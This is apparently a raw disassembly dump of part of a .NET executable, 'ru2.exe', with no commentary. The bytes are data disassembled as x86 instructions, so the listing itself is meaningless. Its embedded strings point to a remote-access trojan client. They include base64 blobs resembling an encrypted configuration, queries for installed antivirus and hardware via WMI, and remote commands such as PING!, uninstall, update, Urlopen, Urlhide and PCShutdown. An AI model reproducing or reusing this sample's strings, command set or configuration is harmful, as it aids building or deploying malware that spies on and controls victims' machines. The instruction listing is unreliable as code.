  407fdf:	43                   	inc    %ebx
  407fe0:	6f                   	outsl  %ds:(%esi),(%dx)
  407fe1:	72 65                	jb     0x408048
  407fe3:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  407fe6:	6c                   	insb   (%dx),%es:(%edi)
  407fe7:	00 75 73             	add    %dh,0x73(%ebp)
  407fea:	65 72 33             	gs jb  0x408020
  407fed:	32 2e                	xor    (%esi),%ch
  407fef:	64 6c                	fs insb (%dx),%es:(%edi)
  407ff1:	6c                   	insb   (%dx),%es:(%edi)
  407ff2:	00 6b 65             	add    %ch,0x65(%ebx)
  407ff5:	72 6e                	jb     0x408065
  407ff7:	65 6c                	gs insb (%dx),%es:(%edi)
  407ff9:	33 32                	xor    (%edx),%esi
  407ffb:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  407ffe:	6c                   	insb   (%dx),%es:(%edi)
  407fff:	00 53 74             	add    %dl,0x74(%ebx)
  408002:	72 75                	jb     0x408079
  408004:	63 74 4c 61          	arpl   %esi,0x61(%esp,%ecx,2)
  408008:	79 6f                	jns    0x408079
  40800a:	75 74                	jne    0x408080
  40800c:	41                   	inc    %ecx
  40800d:	74 74                	je     0x408083
  40800f:	72 69                	jb     0x40807a
  408011:	62 75 74             	bound  %esi,0x74(%ebp)
  408014:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  408019:	6f                   	outsl  %ds:(%esi),(%dx)
  40801a:	75 74                	jne    0x408090
  40801c:	4b                   	dec    %ebx
  40801d:	69 6e 64 00 43 6f 6d 	imul   $0x6d6f4300,0x64(%esi),%ebp
  408024:	70 69                	jo     0x40808f
  408026:	6c                   	insb   (%dx),%es:(%edi)
  408027:	61                   	popa
  408028:	74 69                	je     0x408093
  40802a:	6f                   	outsl  %ds:(%esi),(%dx)
  40802b:	6e                   	outsb  %ds:(%esi),(%dx)
  40802c:	52                   	push   %edx
  40802d:	65 6c                	gs insb (%dx),%es:(%edi)
  40802f:	61                   	popa
  408030:	78 61                	js     0x408093
  408032:	74 69                	je     0x40809d
  408034:	6f                   	outsl  %ds:(%esi),(%dx)
  408035:	6e                   	outsb  %ds:(%esi),(%dx)
  408036:	73 41                	jae    0x408079
  408038:	74 74                	je     0x4080ae
  40803a:	72 69                	jb     0x4080a5
  40803c:	62 75 74             	bound  %esi,0x74(%ebp)
  40803f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408043:	6e                   	outsb  %ds:(%esi),(%dx)
  408044:	74 69                	je     0x4080af
  408046:	6d                   	insl   (%dx),%es:(%edi)
  408047:	65 43                	gs inc %ebx
  408049:	6f                   	outsl  %ds:(%esi),(%dx)
  40804a:	6d                   	insl   (%dx),%es:(%edi)
  40804b:	70 61                	jo     0x4080ae
  40804d:	74 69                	je     0x4080b8
  40804f:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408052:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408059:	69 
  40805a:	62 75 74             	bound  %esi,0x74(%ebp)
  40805d:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  408061:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  408068:	62 
  408069:	75 74                	jne    0x4080df
  40806b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40806f:	73 65                	jae    0x4080d6
  408071:	6d                   	insl   (%dx),%es:(%edi)
  408072:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408076:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40807d:	69 
  40807e:	6f                   	outsl  %ds:(%esi),(%dx)
  40807f:	6e                   	outsb  %ds:(%esi),(%dx)
  408080:	41                   	inc    %ecx
  408081:	74 74                	je     0x4080f7
  408083:	72 69                	jb     0x4080ee
  408085:	62 75 74             	bound  %esi,0x74(%ebp)
  408088:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40808c:	73 65                	jae    0x4080f3
  40808e:	6d                   	insl   (%dx),%es:(%edi)
  40808f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408093:	72 61                	jb     0x4080f6
  408095:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408098:	61                   	popa
  408099:	72 6b                	jb     0x408106
  40809b:	41                   	inc    %ecx
  40809c:	74 74                	je     0x408112
  40809e:	72 69                	jb     0x408109
  4080a0:	62 75 74             	bound  %esi,0x74(%ebp)
  4080a3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4080a7:	73 65                	jae    0x40810e
  4080a9:	6d                   	insl   (%dx),%es:(%edi)
  4080aa:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4080ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4080af:	70 79                	jo     0x40812a
  4080b1:	72 69                	jb     0x40811c
  4080b3:	67 68 74 41 74 74    	addr16 push $0x74744174
  4080b9:	72 69                	jb     0x408124
  4080bb:	62 75 74             	bound  %esi,0x74(%ebp)
  4080be:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4080c2:	73 65                	jae    0x408129
  4080c4:	6d                   	insl   (%dx),%es:(%edi)
  4080c5:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4080c9:	72 6f                	jb     0x40813a
  4080cb:	64 75 63             	fs jne 0x408131
  4080ce:	74 41                	je     0x408111
  4080d0:	74 74                	je     0x408146
  4080d2:	72 69                	jb     0x40813d
  4080d4:	62 75 74             	bound  %esi,0x74(%ebp)
  4080d7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4080db:	73 65                	jae    0x408142
  4080dd:	6d                   	insl   (%dx),%es:(%edi)
  4080de:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4080e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4080e3:	6d                   	insl   (%dx),%es:(%edi)
  4080e4:	70 61                	jo     0x408147
  4080e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4080e7:	79 41                	jns    0x40812a
  4080e9:	74 74                	je     0x40815f
  4080eb:	72 69                	jb     0x408156
  4080ed:	62 75 74             	bound  %esi,0x74(%ebp)
  4080f0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4080f4:	73 65                	jae    0x40815b
  4080f6:	6d                   	insl   (%dx),%es:(%edi)
  4080f7:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4080fb:	65 73 63             	gs jae 0x408161
  4080fe:	72 69                	jb     0x408169
  408100:	70 74                	jo     0x408176
  408102:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408109:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408110:	73 73                	jae    0x408185
  408112:	65 6d                	gs insl (%dx),%es:(%edi)
  408114:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408118:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40811f:	72 
  408120:	69 62 75 74 65 00 72 	imul   $0x72006574,0x75(%edx),%esp
  408127:	75 32                	jne    0x40815b
  408129:	00 72 75             	add    %dh,0x75(%edx)
  40812c:	32 2e                	xor    (%esi),%ch
  40812e:	65 78 65             	gs js  0x408196
  408131:	00 00                	add    %al,(%eax)
  408133:	00 00                	add    %al,(%eax)
  408135:	59                   	pop    %ecx
  408136:	77 00                	ja     0x408138
  408138:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40813c:	46                   	inc    %esi
  40813d:	00 37                	add    %dh,(%edi)
  40813f:	00 72 00             	add    %dh,0x0(%edx)
  408142:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  408146:	76 00                	jbe    0x408148
  408148:	56                   	push   %esi
  408149:	00 68 00             	add    %ch,0x0(%eax)
  40814c:	52                   	push   %edx
  40814d:	00 65 00             	add    %ah,0x0(%ebp)
  408150:	72 00                	jb     0x408152
  408152:	61                   	popa
  408153:	00 49 00             	add    %cl,0x0(%ecx)
  408156:	6f                   	outsl  %ds:(%esi),(%dx)
  408157:	00 34 00             	add    %dh,(%eax,%eax,1)
  40815a:	38 00                	cmp    %al,(%eax)
  40815c:	59                   	pop    %ecx
  40815d:	00 6b 00             	add    %ch,0x0(%ebx)
  408160:	71 00                	jno    0x408162
  408162:	43                   	inc    %ebx
  408163:	00 58 00             	add    %bl,0x0(%eax)
  408166:	42                   	inc    %edx
  408167:	00 78 00             	add    %bh,0x0(%eax)
  40816a:	56                   	push   %esi
  40816b:	00 4a 00             	add    %cl,0x0(%edx)
  40816e:	48                   	dec    %eax
  40816f:	00 73 00             	add    %dh,0x0(%ebx)
  408172:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  408176:	50                   	push   %eax
  408177:	00 66 00             	add    %ah,0x0(%esi)
  40817a:	42                   	inc    %edx
  40817b:	00 6f 00             	add    %ch,0x0(%edi)
  40817e:	6a 00                	push   $0x0
  408180:	62 00                	bound  %eax,(%eax)
  408182:	33 00                	xor    (%eax),%eax
  408184:	79 00                	jns    0x408186
  408186:	36 00 31             	add    %dh,%ss:(%ecx)
  408189:	00 55 00             	add    %dl,0x0(%ebp)
  40818c:	3d 00 00 31 5a       	cmp    $0x5a310000,%eax
  408191:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  408195:	00 39                	add    %bh,(%ecx)
  408197:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40819b:	00 62 00             	add    %ah,0x0(%edx)
  40819e:	57                   	push   %edi
  40819f:	00 59 00             	add    %bl,0x0(%ecx)
  4081a2:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  4081a6:	73 00                	jae    0x4081a8
  4081a8:	43                   	inc    %ebx
  4081a9:	00 78 00             	add    %bh,0x0(%eax)
  4081ac:	57                   	push   %edi
  4081ad:	00 35 00 65 00 42    	add    %dh,0x42006500
  4081b3:	00 31                	add    %dh,(%ecx)
  4081b5:	00 66 00             	add    %ah,0x0(%esi)
  4081b8:	54                   	push   %esp
  4081b9:	00 41 00             	add    %al,0x0(%ecx)
  4081bc:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  4081c1:	31 31                	xor    %esi,(%ecx)
  4081c3:	00 34 00             	add    %dh,(%eax,%eax,1)
  4081c6:	38 00                	cmp    %al,(%eax)
  4081c8:	52                   	push   %edx
  4081c9:	00 37                	add    %dh,(%edi)
  4081cb:	00 42 00             	add    %al,0x0(%edx)
  4081ce:	30 00                	xor    %al,(%eax)
  4081d0:	55                   	push   %ebp
  4081d1:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  4081d5:	00 75 00             	add    %dh,0x0(%ebp)
  4081d8:	58                   	pop    %eax
  4081d9:	00 4a 00             	add    %cl,0x0(%edx)
  4081dc:	52                   	push   %edx
  4081dd:	00 62 00             	add    %ah,0x0(%edx)
  4081e0:	51                   	push   %ecx
  4081e1:	00 68 00             	add    %ch,0x0(%eax)
  4081e4:	32 00                	xor    (%eax),%al
  4081e6:	45                   	inc    %ebp
  4081e7:	00 30                	add    %dh,(%eax)
  4081e9:	00 53 00             	add    %dl,0x0(%ebx)
  4081ec:	51                   	push   %ecx
  4081ed:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  4081f3:	31 37                	xor    %esi,(%edi)
  4081f5:	00 67 00             	add    %ah,0x0(%edi)
  4081f8:	62 00                	bound  %eax,(%eax)
  4081fa:	79 00                	jns    0x4081fc
  4081fc:	38 00                	cmp    %al,(%eax)
  4081fe:	4f                   	dec    %edi
  4081ff:	00 45 00             	add    %al,0x0(%ebp)
  408202:	49                   	dec    %ecx
  408203:	00 6f 00             	add    %ch,0x0(%edi)
  408206:	34 00                	xor    $0x0,%al
  408208:	76 00                	jbe    0x40820a
  40820a:	58                   	pop    %eax
  40820b:	00 4f 00             	add    %cl,0x0(%edi)
  40820e:	33 00                	xor    (%eax),%eax
  408210:	69 00 61 00 65 00    	imul   $0x650061,(%eax),%eax
  408216:	4b                   	dec    %ebx
  408217:	00 79 00             	add    %bh,0x0(%ecx)
  40821a:	6a 00                	push   $0x0
  40821c:	74 00                	je     0x40821e
  40821e:	77 00                	ja     0x408220
  408220:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  408225:	03 31                	add    (%ecx),%esi
  408227:	00 00                	add    %al,(%eax)
  408229:	59                   	pop    %ecx
  40822a:	30 00                	xor    %al,(%eax)
  40822c:	2f                   	das
  40822d:	00 4b 00             	add    %cl,0x0(%ebx)
  408230:	74 00                	je     0x408232
  408232:	42                   	inc    %edx
  408233:	00 2b                	add    %ch,(%ebx)
  408235:	00 34 00             	add    %dh,(%eax,%eax,1)
  408238:	72 00                	jb     0x40823a
  40823a:	4a                   	dec    %edx
  40823b:	00 4b 00             	add    %cl,0x0(%ebx)
  40823e:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  408241:	00 7a 00             	add    %bh,0x0(%edx)
  408244:	39 00                	cmp    %eax,(%eax)
  408246:	75 00                	jne    0x408248
  408248:	69 00 4a 00 31 00    	imul   $0x31004a,(%eax),%eax
  40824e:	57                   	push   %edi
  40824f:	00 4a 00             	add    %cl,0x0(%edx)
  408252:	2b 00                	sub    (%eax),%eax
  408254:	43                   	inc    %ebx
  408255:	00 4b 00             	add    %cl,0x0(%ebx)
  408258:	4f                   	dec    %edi
  408259:	00 4f 00             	add    %cl,0x0(%edi)
  40825c:	5a                   	pop    %edx
  40825d:	00 30                	add    %dh,(%eax)
  40825f:	00 4d 00             	add    %cl,0x0(%ebp)
  408262:	30 00                	xor    %al,(%eax)
  408264:	43                   	inc    %ebx
  408265:	00 30                	add    %dh,(%eax)
  408267:	00 6f 00             	add    %ch,0x0(%edi)
  40826a:	56                   	push   %esi
  40826b:	00 69 00             	add    %ch,0x0(%ecx)
  40826e:	74 00                	je     0x408270
  408270:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  408274:	70 00                	jo     0x408276
  408276:	55                   	push   %ebp
  408277:	00 7a 00             	add    %bh,0x0(%edx)
  40827a:	6a 00                	push   $0x0
  40827c:	37                   	aaa
  40827d:	00 49 00             	add    %cl,0x0(%ecx)
  408280:	3d 00 00 31 4e       	cmp    $0x4e310000,%eax
  408285:	00 6f 00             	add    %ch,0x0(%edi)
  408288:	73 00                	jae    0x40828a
  40828a:	79 00                	jns    0x40828c
  40828c:	2b 00                	sub    (%eax),%eax
  40828e:	56                   	push   %esi
  40828f:	00 4a 00             	add    %cl,0x0(%edx)
  408292:	41                   	inc    %ecx
  408293:	00 47 00             	add    %al,0x0(%edi)
  408296:	59                   	pop    %ecx
  408297:	00 78 00             	add    %bh,0x0(%eax)
  40829a:	44                   	inc    %esp
  40829b:	00 35 00 53 00 66    	add    %dh,0x66005300
  4082a1:	00 2f                	add    %ch,(%edi)
  4082a3:	00 45 00             	add    %al,0x0(%ebp)
  4082a6:	62 00                	bound  %eax,(%eax)
  4082a8:	45                   	inc    %ebp
  4082a9:	00 4a 00             	add    %cl,0x0(%edx)
  4082ac:	7a 00                	jp     0x4082ae
  4082ae:	67 00 3d             	add    %bh,(%di)
  4082b1:	00 3d 00 00 21 38    	add    %bh,0x38210000
  4082b7:	00 4d 00             	add    %cl,0x0(%ebp)
  4082ba:	33 00                	xor    (%eax),%eax
  4082bc:	49                   	dec    %ecx
  4082bd:	00 62 00             	add    %ah,0x0(%edx)
  4082c0:	6d                   	insl   (%dx),%es:(%edi)
  4082c1:	00 79 00             	add    %bh,0x0(%ecx)
  4082c4:	6a 00                	push   $0x0
  4082c6:	39 00                	cmp    %eax,(%eax)
  4082c8:	74 00                	je     0x4082ca
  4082ca:	6a 00                	push   $0x0
  4082cc:	76 00                	jbe    0x4082ce
  4082ce:	68 00 78 00 5a       	push   $0x5a007800
  4082d3:	00 72 00             	add    %dh,0x0(%edx)
  4082d6:	00 09                	add    %cl,(%ecx)
  4082d8:	49                   	dec    %ecx
  4082d9:	00 4e 00             	add    %cl,0x0(%esi)
  4082dc:	46                   	inc    %esi
  4082dd:	00 4f 00             	add    %cl,0x0(%edi)
  4082e0:	00 13                	add    %dl,(%ebx)
  4082e2:	4d                   	dec    %ebp
  4082e3:	00 69 00             	add    %ch,0x0(%ecx)
  4082e6:	63 00                	arpl   %eax,(%eax)
  4082e8:	72 00                	jb     0x4082ea
  4082ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4082eb:	00 73 00             	add    %dh,0x0(%ebx)
  4082ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ef:	00 66 00             	add    %ah,0x0(%esi)
  4082f2:	74 00                	je     0x4082f4
  4082f4:	00 19                	add    %bl,(%ecx)
  4082f6:	53                   	push   %ebx
  4082f7:	00 65 00             	add    %ah,0x0(%ebp)
  4082fa:	72 00                	jb     0x4082fc
  4082fc:	76 00                	jbe    0x4082fe
  4082fe:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  408304:	20 00                	and    %al,(%eax)
  408306:	50                   	push   %eax
  408307:	00 61 00             	add    %ah,0x0(%ecx)
  40830a:	63 00                	arpl   %eax,(%eax)
  40830c:	6b 00 00             	imul   $0x0,(%eax),%eax
  40830f:	05 53 00 50 00       	add    $0x500053,%eax
  408314:	00 03                	add    %al,(%ebx)
  408316:	20 00                	and    %al,(%eax)
  408318:	00 0b                	add    %cl,(%ebx)
  40831a:	46                   	inc    %esi
  40831b:	00 61 00             	add    %ah,0x0(%ecx)
  40831e:	6c                   	insb   (%dx),%es:(%edi)
  40831f:	00 73 00             	add    %dh,0x0(%ebx)
  408322:	65 00 00             	add    %al,%gs:(%eax)
  408325:	0b 33                	or     (%ebx),%esi
  408327:	00 32                	add    %dh,(%edx)
  408329:	00 62 00             	add    %ah,0x0(%edx)
  40832c:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  408332:	54                   	push   %esp
  408333:	00 72 00             	add    %dh,0x0(%edx)
  408336:	75 00                	jne    0x408338
  408338:	65 00 00             	add    %al,%gs:(%eax)
  40833b:	0b 36                	or     (%esi),%esi
  40833d:	00 34 00             	add    %dh,(%eax,%eax,1)
  408340:	62 00                	bound  %eax,(%eax)
  408342:	69 00 74 00 00 13    	imul   $0x13000074,(%eax),%eax
  408348:	64 00 64 00 2f       	add    %ah,%fs:0x2f(%eax,%eax,1)
  40834d:	00 4d 00             	add    %cl,0x0(%ebp)
  408350:	4d                   	dec    %ebp
  408351:	00 2f                	add    %ch,(%edi)
  408353:	00 79 00             	add    %bh,0x0(%ecx)
  408356:	79 00                	jns    0x408358
  408358:	79 00                	jns    0x40835a
  40835a:	00 0b                	add    %cl,(%ebx)
  40835c:	45                   	inc    %ebp
  40835d:	00 72 00             	add    %dh,0x0(%edx)
  408360:	72 00                	jb     0x408362
  408362:	6f                   	outsl  %ds:(%esi),(%dx)
  408363:	00 72 00             	add    %dh,0x0(%edx)
  408366:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40836c:	00 2b                	add    %ch,(%ebx)
  40836e:	5c                   	pop    %esp
  40836f:	00 72 00             	add    %dh,0x0(%edx)
  408372:	6f                   	outsl  %ds:(%esi),(%dx)
  408373:	00 6f 00             	add    %ch,0x0(%edi)
  408376:	74 00                	je     0x408378
  408378:	5c                   	pop    %esp
  408379:	00 53 00             	add    %dl,0x0(%ebx)
  40837c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408380:	75 00                	jne    0x408382
  408382:	72 00                	jb     0x408384
  408384:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40838a:	43                   	inc    %ebx
  40838b:	00 65 00             	add    %ah,0x0(%ebp)
  40838e:	6e                   	outsb  %ds:(%esi),(%dx)
  40838f:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408393:	00 72 00             	add    %dh,0x0(%edx)
  408396:	32 00                	xor    (%eax),%al
  408398:	00 3d 53 00 65 00    	add    %bh,0x650053
  40839e:	6c                   	insb   (%dx),%es:(%edi)
  40839f:	00 65 00             	add    %ah,0x0(%ebp)
  4083a2:	63 00                	arpl   %eax,(%eax)
  4083a4:	74 00                	je     0x4083a6
  4083a6:	20 00                	and    %al,(%eax)
  4083a8:	2a 00                	sub    (%eax),%al
  4083aa:	20 00                	and    %al,(%eax)
  4083ac:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4083b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b1:	00 6d 00             	add    %ch,0x0(%ebp)
  4083b4:	20 00                	and    %al,(%eax)
  4083b6:	41                   	inc    %ecx
  4083b7:	00 6e 00             	add    %ch,0x0(%esi)
  4083ba:	74 00                	je     0x4083bc
  4083bc:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  4083c2:	72 00                	jb     0x4083c4
  4083c4:	75 00                	jne    0x4083c6
  4083c6:	73 00                	jae    0x4083c8
  4083c8:	50                   	push   %eax
  4083c9:	00 72 00             	add    %dh,0x0(%edx)
  4083cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4083cd:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  4083d1:	00 63 00             	add    %ah,0x0(%ebx)
  4083d4:	74 00                	je     0x4083d6
  4083d6:	00 17                	add    %dl,(%edi)
  4083d8:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4083dc:	73 00                	jae    0x4083de
  4083de:	70 00                	jo     0x4083e0
  4083e0:	6c                   	insb   (%dx),%es:(%edi)
  4083e1:	00 61 00             	add    %ah,0x0(%ecx)
  4083e4:	79 00                	jns    0x4083e6
  4083e6:	4e                   	dec    %esi
  4083e7:	00 61 00             	add    %ah,0x0(%ecx)
  4083ea:	6d                   	insl   (%dx),%es:(%edi)
  4083eb:	00 65 00             	add    %ah,0x0(%ebp)
  4083ee:	00 03                	add    %al,(%ebx)
  4083f0:	2c 00                	sub    $0x0,%al
  4083f2:	00 09                	add    %cl,(%ecx)
  4083f4:	4e                   	dec    %esi
  4083f5:	00 6f 00             	add    %ch,0x0(%edi)
  4083f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f9:	00 65 00             	add    %ah,0x0(%ebp)
  4083fc:	00 47 53             	add    %al,0x53(%edi)
  4083ff:	00 45 00             	add    %al,0x0(%ebp)
  408402:	4c                   	dec    %esp
  408403:	00 45 00             	add    %al,0x0(%ebp)
  408406:	43                   	inc    %ebx
  408407:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40840b:	00 2a                	add    %ch,(%edx)
  40840d:	00 20                	add    %ah,(%eax)
  40840f:	00 46 00             	add    %al,0x0(%esi)
  408412:	52                   	push   %edx
  408413:	00 4f 00             	add    %cl,0x0(%edi)
  408416:	4d                   	dec    %ebp
  408417:	00 20                	add    %ah,(%eax)
  408419:	00 57 00             	add    %dl,0x0(%edi)
  40841c:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  408422:	32 00                	xor    (%eax),%al
  408424:	5f                   	pop    %edi
  408425:	00 56 00             	add    %dl,0x0(%esi)
  408428:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40842e:	6f                   	outsl  %ds:(%esi),(%dx)
  40842f:	00 43 00             	add    %al,0x0(%ebx)
  408432:	6f                   	outsl  %ds:(%esi),(%dx)
  408433:	00 6e 00             	add    %ch,0x0(%esi)
  408436:	74 00                	je     0x408438
  408438:	72 00                	jb     0x40843a
  40843a:	6f                   	outsl  %ds:(%esi),(%dx)
  40843b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40843f:	00 65 00             	add    %ah,0x0(%ebp)
  408442:	72 00                	jb     0x408444
  408444:	00 09                	add    %cl,(%ecx)
  408446:	4e                   	dec    %esi
  408447:	00 61 00             	add    %ah,0x0(%ecx)
  40844a:	6d                   	insl   (%dx),%es:(%edi)
  40844b:	00 65 00             	add    %ah,0x0(%ebp)
  40844e:	00 3f                	add    %bh,(%edi)
  408450:	57                   	push   %edi
  408451:	00 69 00             	add    %ch,0x0(%ecx)
  408454:	6e                   	outsb  %ds:(%esi),(%dx)
  408455:	00 33                	add    %dh,(%ebx)
  408457:	00 32                	add    %dh,(%edx)
  408459:	00 5f 00             	add    %bl,0x0(%edi)
  40845c:	50                   	push   %eax
  40845d:	00 72 00             	add    %dh,0x0(%edx)
  408460:	6f                   	outsl  %ds:(%esi),(%dx)
  408461:	00 63 00             	add    %ah,0x0(%ebx)
  408464:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408468:	73 00                	jae    0x40846a
  40846a:	6f                   	outsl  %ds:(%esi),(%dx)
  40846b:	00 72 00             	add    %dh,0x0(%edx)
  40846e:	2e 00 64 00 65       	add    %ah,%cs:0x65(%eax,%eax,1)
  408473:	00 76 00             	add    %dh,0x0(%esi)
  408476:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40847c:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  408482:	22 00                	and    (%eax),%al
  408484:	43                   	inc    %ebx
  408485:	00 50 00             	add    %dl,0x0(%eax)
  408488:	55                   	push   %ebp
  408489:	00 30                	add    %dh,(%eax)
  40848b:	00 22                	add    %ah,(%edx)
  40848d:	00 00                	add    %al,(%eax)
  40848f:	07                   	pop    %es
  408490:	28 00                	sub    %al,(%eax)
  408492:	52                   	push   %edx
  408493:	00 29                	add    %ch,(%ecx)
  408495:	00 00                	add    %al,(%eax)
  408497:	01 00                	add    %eax,(%eax)
  408499:	11 43 00             	adc    %eax,0x0(%ebx)
  40849c:	6f                   	outsl  %ds:(%esi),(%dx)
  40849d:	00 72 00             	add    %dh,0x0(%edx)
  4084a0:	65 00 28             	add    %ch,%gs:(%eax)
  4084a3:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  4084a7:	00 29                	add    %ch,(%ecx)
  4084a9:	00 00                	add    %al,(%eax)
  4084ab:	07                   	pop    %es
  4084ac:	43                   	inc    %ebx
  4084ad:	00 50 00             	add    %dl,0x0(%eax)
  4084b0:	55                   	push   %ebp
  4084b1:	00 00                	add    %al,(%eax)
  4084b3:	07                   	pop    %es
  4084b4:	20 00                	and    %al,(%eax)
  4084b6:	47                   	inc    %edi
  4084b7:	00 42 00             	add    %al,0x0(%edx)
  4084ba:	00 07                	add    %al,(%edi)
  4084bc:	20 00                	and    %al,(%eax)
  4084be:	4d                   	dec    %ebp
  4084bf:	00 42 00             	add    %al,0x0(%edx)
  4084c2:	00 0b                	add    %cl,(%ebx)
  4084c4:	53                   	push   %ebx
  4084c5:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4084c9:	00 72 00             	add    %dh,0x0(%edx)
  4084cc:	74 00                	je     0x4084ce
  4084ce:	00 03                	add    %al,(%ebx)
  4084d0:	00 00                	add    %al,(%eax)
  4084d2:	01 0b                	add    %ecx,(%ebx)
  4084d4:	50                   	push   %eax
  4084d5:	00 49 00             	add    %cl,0x0(%ecx)
  4084d8:	4e                   	dec    %esi
  4084d9:	00 47 00             	add    %al,0x0(%edi)
  4084dc:	21 00                	and    %eax,(%eax)
  4084de:	00 09                	add    %cl,(%ecx)
  4084e0:	70 00                	jo     0x4084e2
  4084e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e3:	00 6e 00             	add    %ch,0x0(%esi)
  4084e6:	67 00 00             	add    %al,(%bx,%si)
  4084e9:	07                   	pop    %es
  4084ea:	72 00                	jb     0x4084ec
  4084ec:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4084f0:	00 0b                	add    %cl,(%ebx)
  4084f2:	43                   	inc    %ebx
  4084f3:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  4084f7:	00 53 00             	add    %dl,0x0(%ebx)
  4084fa:	45                   	inc    %ebp
  4084fb:	00 00                	add    %al,(%eax)
  4084fd:	13 75 00             	adc    0x0(%ebp),%esi
  408500:	6e                   	outsb  %ds:(%esi),(%dx)
  408501:	00 69 00             	add    %ch,0x0(%ecx)
  408504:	6e                   	outsb  %ds:(%esi),(%dx)
  408505:	00 73 00             	add    %dh,0x0(%ebx)
  408508:	74 00                	je     0x40850a
  40850a:	61                   	popa
  40850b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40850f:	00 00                	add    %al,(%eax)
  408511:	0d 75 00 70 00       	or     $0x700075,%eax
  408516:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40851a:	74 00                	je     0x40851c
  40851c:	65 00 00             	add    %al,%gs:(%eax)
  40851f:	05 44 00 57 00       	add    $0x570044,%eax
  408524:	00 05 46 00 4d 00    	add    %al,0x4d0046
  40852a:	00 05 4c 00 4e 00    	add    %al,0x4e004c
  408530:	00 0f                	add    %cl,(%edi)
  408532:	55                   	push   %ebp
  408533:	00 72 00             	add    %dh,0x0(%edx)
  408536:	6c                   	insb   (%dx),%es:(%edi)
  408537:	00 6f 00             	add    %ch,0x0(%edi)
  40853a:	70 00                	jo     0x40853c
  40853c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408540:	00 0f                	add    %cl,(%edi)
  408542:	55                   	push   %ebp
  408543:	00 72 00             	add    %dh,0x0(%edx)
  408546:	6c                   	insb   (%dx),%es:(%edi)
  408547:	00 68 00             	add    %ch,0x0(%eax)
  40854a:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  408550:	00 15 50 00 43 00    	add    %dl,0x430050
  408556:	53                   	push   %ebx
  408557:	00 68 00             	add    %ch,0x0(%eax)
  40855a:	75 00                	jne    0x40855c
  40855c:	74 00                	je     0x40855e
  40855e:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  408562:	77 00                	ja     0x408564
  408564:	6e                   	outsb  %ds:(%esi),(%dx)
  408565:	00 00                	add    %al,(%eax)
  408567:	2f                   	das
